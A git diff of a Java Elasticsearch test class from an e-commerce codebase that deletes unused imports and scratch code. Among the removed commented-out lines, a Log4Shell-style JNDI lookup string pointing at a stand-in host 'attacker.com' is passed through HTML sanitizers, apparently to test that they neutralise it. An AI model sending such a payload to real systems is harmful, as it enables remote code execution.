@@ -7,8 +7,6 @@ import cn.lili.modules.goods.entity.dos.GoodsSku;
 import cn.lili.modules.goods.entity.enums.GoodsAuthEnum;
 import cn.lili.modules.goods.entity.enums.GoodsStatusEnum;
 import cn.lili.modules.goods.service.GoodsSkuService;
-import cn.lili.modules.promotion.entity.dos.FullDiscount;
-import cn.lili.modules.promotion.entity.dto.BasePromotions;
 import cn.lili.modules.promotion.service.PromotionService;
 import cn.lili.modules.search.entity.dos.EsGoodsAttribute;
 import cn.lili.modules.search.entity.dos.EsGoodsIndex;
@@ -27,7 +25,6 @@ import org.springframework.data.elasticsearch.core.SearchPage;
 import org.springframework.test.context.junit.jupiter.SpringExtension;
 
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
 import java.util.Map;
 
@@ -68,15 +65,6 @@ class EsTest {
 //        Date dt1 = new Date(2021, 12, 10);
 //        Date dt2 = new Date(2021, 12, 14);
 //
-//        System.out.println(new Date().before(dt2));
-//        String filter = HtmlUtil.filter("${jndi:ldap://attacker.com/a}");
-//        String sanitize = Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize("${jndi:ldap://attacker.com/a}");
-//        System.out.println(filter);
-//        System.out.println(sanitize);
-        FullDiscount fullDiscount = new FullDiscount();
-        fullDiscount.setStartTime(new Date());
-        BasePromotions promotions = fullDiscount;
-        System.out.println(promotions);
 
     }
 
